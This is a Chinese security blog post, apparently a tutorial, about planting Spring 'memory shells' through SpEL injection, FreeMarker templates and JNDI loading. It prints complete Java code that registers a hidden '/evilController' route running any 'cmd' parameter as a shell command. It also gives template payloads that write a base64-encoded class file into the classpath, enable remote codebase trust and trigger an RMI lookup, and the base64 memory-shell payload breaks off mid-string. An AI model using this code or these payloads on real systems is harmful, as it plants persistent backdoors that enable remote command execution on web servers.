+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250814101541840.png" srcset="/img/loading.gif" lazyload alt="image-20250814101541840"></p>
+<h3 id="SPEL-内存马"><a href="#SPEL-内存马" class="headerlink" title="SPEL 内存马"></a>SPEL 内存马</h3><p>首先 spring 下的内存马有两种 controller 和 Interceptor 内存马，本质其实和 tomcat 中内存马的原理是一致的，都是请求处理器的动态注册。不了解的话可以看 <a target="_blank" rel="noopener" href="https://www.javasec.org/javaweb/MemoryShell/#spring-controller-%E5%86%85%E5%AD%98%E9%A9%AC">这篇文章</a> ，</p>
+<p>springboot 中常见的内存马代码 </p>
+<blockquote>
+<p>适用于 spring framework 6.0 (springboot 3.x) 以前</p>
+<p>因为 Spring Framework 6.0（对应 Spring Boot 3.x），默认启用 PathPattern 匹配，旧构造方式与默认策略不兼容，实际等同于“不可用&#x2F;易出错”，应完全迁移到 Builder，及 <code>RequestMappingInfo.paths(...).methods(...).options(...).build()</code> 构造方式 ，且 urlLookup 切换为 pathLookup </p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">index</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">controllerPath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/su18&quot;</span>;<br><br>    <span class="hljs-comment">// 获取当前应用上下文</span><br>    <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());<br><br>    <span class="hljs-comment">// 通过 context 获取 RequestMappingHandlerMapping 对象</span><br>    <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><br>    <span class="hljs-comment">// 获取父类的 MappingRegistry 属性</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> mapping.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;mappingRegistry&quot;</span>);<br>    f.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">mappingRegistry</span> <span class="hljs-operator">=</span> f.get(mapping);<br><br>    <span class="hljs-comment">// 反射调用 MappingRegistry 的 register 方法</span><br>    Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry&quot;</span>);<br><br>    Method[] ms = c.getDeclaredMethods();<br><br>    <span class="hljs-comment">// 判断当前路径是否已经添加</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;urlLookup&quot;</span>);<br>    field.setAccessible(<span class="hljs-literal">true</span>);<br><br>    Map&lt;String, Object&gt; urlLookup = (Map&lt;String, Object&gt;) field.get(mappingRegistry);<br>    <span class="hljs-keyword">for</span> (String urlPath : urlLookup.keySet()) &#123;<br>        <span class="hljs-keyword">if</span> (controllerPath.equals(urlPath)) &#123;<br>            response.getWriter().println(<span class="hljs-string">&quot;controller url path exist already&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 初始化一些注册需要的信息</span><br>    <span class="hljs-type">PatternsRequestCondition</span>       <span class="hljs-variable">url</span>       <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(controllerPath);<br>    <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br>    <span class="hljs-type">RequestMappingInfo</span>             <span class="hljs-variable">info</span>      <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, condition, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>    Class&lt;?&gt; myClass = DynamicUtils.getClass(CONTROLLER_CLASS_STRING);<br><br>    <span class="hljs-keyword">for</span> (Method method : ms) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;register&quot;</span>.equals(method.getName())) &#123;<br>            <span class="hljs-comment">// 反射调用 MappingRegistry 的 register 方法注册 TestController 的 index</span><br>            method.setAccessible(<span class="hljs-literal">true</span>);<br>            method.invoke(mappingRegistry, info, myClass.newInstance(), myClass.getMethods()[<span class="hljs-number">0</span>]);<br>            response.getWriter().println(<span class="hljs-string">&quot;spring controller add&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在 spring framework 6.0 以后，稍加修改，原理不变</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> jakarta.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.support.RequestContextUtils;<br><span class="hljs-keyword">import</span> org.springframework.web.util.pattern.PathPatternParser;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.charset.Charset;<br><span class="hljs-keyword">import</span> java.util.Locale;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">memController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResponseEntity&lt;String&gt; <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123;<br>        String stdout;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isWindows</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase(Locale.ROOT).contains(<span class="hljs-string">&quot;win&quot;</span>);<br>            <span class="hljs-type">Charset</span> <span class="hljs-variable">charset</span> <span class="hljs-operator">=</span> isWindows ? Charset.forName(<span class="hljs-string">&quot;GBK&quot;</span>) : Charset.forName(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            String[] cmdArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;<br>            <span class="hljs-keyword">if</span>(isWindows)&#123;<br>                cmdArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;<br>            &#125;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmdArray);<br>            stdout = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(process.getInputStream().readAllBytes(),<br>                    charset);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ResponseEntity.ok(stdout);<br>    &#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/evilController&quot;</span>;<br><br><br>            <span class="hljs-type">ServletRequestAttributes</span> <span class="hljs-variable">attributes</span> <span class="hljs-operator">=</span> (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request1</span> <span class="hljs-operator">=</span> attributes.getRequest();<br>            <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">webApplicationContext</span> <span class="hljs-operator">=</span> RequestContextUtils.findWebApplicationContext(request1);<br>            <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mapping</span> <span class="hljs-operator">=</span> webApplicationContext.getBean(<span class="hljs-string">&quot;requestMappingHandlerMapping&quot;</span>, RequestMappingHandlerMapping.class);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> mapping.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;mappingRegistry&quot;</span>);<br>            f.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">mappingRegistry</span> <span class="hljs-operator">=</span> f.get(mapping);<br>            RequestMappingInfo.<span class="hljs-type">BuilderConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>.BuilderConfiguration();<br>            config.setPatternParser(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PathPatternParser</span>());<br>            <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">requestMappingInfo</span> <span class="hljs-operator">=</span><br>                    RequestMappingInfo.paths(PATH).methods(RequestMethod.GET).options(config).build();<br><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">register</span> <span class="hljs-operator">=</span> mappingRegistry.getClass().getDeclaredMethod(<span class="hljs-string">&quot;register&quot;</span>, Object.class, Object.class, Method.class);<br>            register.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> memController.class.getDeclaredMethod(<span class="hljs-string">&quot;test&quot;</span>);<br>            register.invoke(mappingRegistry, requestMappingInfo, <span class="hljs-keyword">new</span> <span class="hljs-title class_">memController</span>(), method);<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>现在项目中测试 ， 直接在 IndexController 中 加入 new memController() </p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250814152656135.png" srcset="/img/loading.gif" lazyload alt="image-20250814152656135" style="zoom: 50%;" />
+
+<p>访问 IndexController</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250814152806155.png" srcset="/img/loading.gif" lazyload alt="image-20250814152806155" style="zoom:50%;" />
+
+<p>然后就可以访问内存马了</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://localhost:8080/evilController?cmd=whoami<br></code></pre></td></tr></table></figure>
+
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250814152920295.png" srcset="/img/loading.gif" lazyload alt="image-20250814152920295" style="zoom:50%;" />
+
+<p>测试成功打入了内存马</p>
+<h4 id="SPEL-JNDI-远程加载"><a href="#SPEL-JNDI-远程加载" class="headerlink" title="SPEL+JNDI 远程加载"></a>SPEL+JNDI 远程加载</h4><p>可以打配合，但是没办法直接把 trustURLCodebase 改为 true，因为容器启动过程中会初始化，可以配合 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/LINGX5/p/18780870">java-JNDI(二)高版本绕过 </a> 来实现攻击，如果有反序列化可以打的话，也可以实现内存马</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign pas=<span class="hljs-string">&quot;&#123;new javax.naming.InitialContext().lookup(\&quot;rmi://localhost:1099/mem\&quot;)&#125;&quot;</span>&gt;<br>$&#123;<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-keyword">new</span>()(<span class="hljs-string">&quot;org.springframework.expression.spel.standard.SpelExpressionParser&quot;</span>).parseExpression(pas).getValue()&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="SPEL-JNDI-本地加载"><a href="#SPEL-JNDI-本地加载" class="headerlink" title="SPEL+JNDI 本地加载"></a>SPEL+JNDI 本地加载</h4><p>不过当然我们当时分析 JNDI 攻击流程的时候，曾经也提到过这样一个特性</p>
+<blockquote>
+<p>JNDI 为了提高性能快速加载，会先从本地的 classpath 路径下搜索这个类，有就直接加载，没有<span style="color:#FF0000;">trustURLCodebase的限制</span>，如果没有类才去远程加载</p>
+</blockquote>
+<p>根据这一特性，我们可以先写文件到 classpath 路径下，然后再去用 jndi 加载 , 这里先用弹计算器的字节码测试</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign pathPas=<span class="hljs-string">&quot;T(java.lang.Thread).currentThread().getContextClassLoader().getResource(\&quot;\&quot;).toString().substring(6)+\&quot;Exec.class\&quot;&quot;</span>&gt;<br>&lt;#assign path=<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-keyword">new</span>()(<span class="hljs-string">&quot;org.springframework.expression.spel.standard.SpelExpressionParser&quot;</span>).parseExpression(pathPas).getValue()?string&gt;<br>$&#123;path&#125;<br>&lt;#assign evilBase64=<span class="hljs-string">&quot;yv66vgAAADQAHgoABwARCgASABMIABQKABIAFQcAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHABYBAApTb3VyY2VGaWxlAQAJRXhlYy5qYXZhDAAIAAkHABkMABoAGwEABGNhbGMMABwAHQEAE2phdmEvbGFuZy9FeGNlcHRpb24BAARFeGVjAQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAGAAcAAAAAAAIAAQAIAAkAAQAKAAAAHQABAAEAAAAFKrcAAbEAAAABAAsAAAAGAAEAAAADAAgADAAJAAEACgAAAEcAAgABAAAADrgAAhIDtgAEV6cABEuxAAEAAAAJAAwABQACAAsAAAASAAQAAAAGAAkACQAMAAcADQAKAA0AAAAHAAJMBwAOAAABAA8AAAACABA=&quot;</span>&gt;<br>&lt;#assign decPas=<span class="hljs-string">&quot;T(java.util.Base64).getDecoder()&quot;</span>&gt;<br>&lt;#assign decoder=<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-keyword">new</span>()(<span class="hljs-string">&quot;org.springframework.expression.spel.standard.SpelExpressionParser&quot;</span>).parseExpression(decPas).getValue()&gt;<br>$&#123;decoder&#125;<br>&lt;#assign bytes=decoder.decode(evilBase64)&gt;<br>$&#123;<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-keyword">new</span>()(<span class="hljs-string">&quot;java.io.FileOutputStream&quot;</span>,path).write(bytes)&#125;<br>&lt;#assign pas2=<span class="hljs-string">&quot;&#123;T(java.lang.System).setProperty(\&quot;com.sun.jndi.rmi.object.trustURLCodebase\&quot;, \&quot;true\&quot;),T(java.lang.System).setProperty(\&quot;com.sun.jndi.ldap.object.trustURLCodebase\&quot;, \&quot;true\&quot;),new javax.naming.InitialContext().lookup(\&quot;rmi://localhost:1099/mem\&quot;)&#125;&quot;</span>&gt;<br>$&#123;<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-keyword">new</span>()(<span class="hljs-string">&quot;org.springframework.expression.spel.standard.SpelExpressionParser&quot;</span>).parseExpression(pas2).getValue()&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以成功执行</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250819224040777.png" srcset="/img/loading.gif" lazyload alt="image-20250819224040777" style="zoom:50%;" />
+
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250819224133300.png" srcset="/img/loading.gif" lazyload alt="image-20250819224133300" style="zoom: 50%;" />
+
+<p>把 evilBase64 换为内存马的类，把 rmi 的地址改一下，就可以实现内存马了</p>
+<h5 id="内存马Payload"><a href="#内存马Payload" class="headerlink" title="内存马Payload"></a>内存马Payload</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign pathPas=<span class="hljs-string">&quot;T(java.lang.Thread).currentThread().getContextClassLoader().getResource(\&quot;\&quot;).toString().substring(6)+\&quot;memController.class\&quot;&quot;</span>&gt;<br>&lt;#assign path=<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-keyword">new</span>()(<span class="hljs-string">&quot;org.springframework.expression.spel.standard.SpelExpressionParser&quot;</span>).parseExpression(pathPas).getValue()?string&gt;<br>$&#123;path&#125;<br>&lt;#assign evilBase64=<span class="hljs-string">&quot;yv66vgAAAD0BAgoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAGGN1cnJlbnRSZXF1ZXN0QXR0cmlidXRlcwEAPSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlczsHAA4BAEBvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvU2VydmxldFJlcXVlc3RBdHRyaWJ1dGVzCgANABAMABEAEgEACmdldFJlcXVlc3QBACsoKUxqYWthcnRhL3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7CAAUAQAHb3MubmFtZQoAFgAXBwAYDAAZABoBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwkAHAAdBwAeDAAfACABABBqYXZhL3V0aWwvTG9jYWxlAQAEUk9PVAEAEkxqYXZhL3V0aWwvTG9jYWxlOwoAIgAjBwAkDAAlACYBABBqYXZhL2xhbmcvU3RyaW5nAQALdG9Mb3dlckNhc2UBACYoTGphdmEvdXRpbC9Mb2NhbGU7KUxqYXZhL2xhbmcvU3RyaW5nOwgAKAEAA3dpbgoAIgAqDAArACwBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWggALgEAA0dCSwoAMAAxBwAyDAAzADQBABhqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQBAAdmb3JOYW1lAQAuKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9uaW8vY2hhcnNldC9DaGFyc2V0OwgANgEABVVURi04CAA4AQADY21kCwA6ADsHADwMAD0AGgEAJ2pha2FydGEvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcggAPwEACS9iaW4vYmFzaAgAQQEAAi1jCABDAQAHY21kLmV4ZQgARQEAAi9jCgBHAEgHAEkMAEoASwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwoARwBNDABOAE8BAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwoAUQBSBwBTDABUAFUBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsKAFcAWAcAWQwAWgBbAQATamF2YS9pby9JbnB1dFN0cmVhbQEADHJlYWRBbGxCeXRlcwEABCgpW0IKACIAXQwABQBeAQAfKFtCTGphdmEvbmlvL2NoYXJzZXQvQ2hhcnNldDspVgcAYAEAE2phdmEvaW8vSU9FeGNlcHRpb24HAGIBABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgoAYQBkDAAFAGUBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYKAGcAaAcAaQwAagBrAQAnb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5AQACb2sBAD0oTGphdmEvbGFuZy9PYmplY3Q7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk7CABtAQAPL2V2aWxDb250cm9sbGVyCgBvAHAHAHEMAHIAcwEAO29yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvc3VwcG9ydC9SZXF1ZXN0Q29udGV4dFV0aWxzAQAZZmluZFdlYkFwcGxpY2F0aW9uQ29udGV4dAEAYihMamFrYXJ0YS9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OylMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQ7CAB1AQAccmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwcAdwEAUm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcLAHkAegcAewwAfAB9AQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQBAAdnZXRCZWFuAQA3KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvT2JqZWN0OwoAAgB/DACAAIEBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsKAIMAhAcAhQwAhgCBAQAPamF2YS9sYW5nL0NsYXNzAQANZ2V0U3VwZXJjbGFzcwgAiAEAD21hcHBpbmdSZWdpc3RyeQoAgwCKDACLAIwBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7CgCOAI8HAJAMAJEAkgEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYKAI4AlAwAlQCWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsHAJgBAFJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXJDb25maWd1cmF0aW9uCgCXAAMHAJsBADZvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm5QYXJzZXIKAJoAAwoAlwCeDACfAKABABBzZXRQYXR0ZXJuUGFyc2VyAQA7KExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm5QYXJzZXI7KVYKAKIAowcApAwApQCmAQA9b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbwEABXBhdGhzAQBcKFtMamF2YS9sYW5nL1N0cmluZzspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsHAKgBADVvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZAkApwCqDACrAKwBAANHRVQBADdMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNZXRob2Q7CwCuAK8HALAMALEAsgEARW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcgEAB21ldGhvZHMBAIEoW0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZDspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsLAK4AtAwAtQC2AQAHb3B0aW9ucwEAnShMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyQ29uZmlndXJhdGlvbjspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsLAK4AuAwAuQC6AQAFYnVpbGQBAEEoKUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvOwgAvAEACHJlZ2lzdGVyBwC+AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kCgCDAMAMAMEAwgEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1t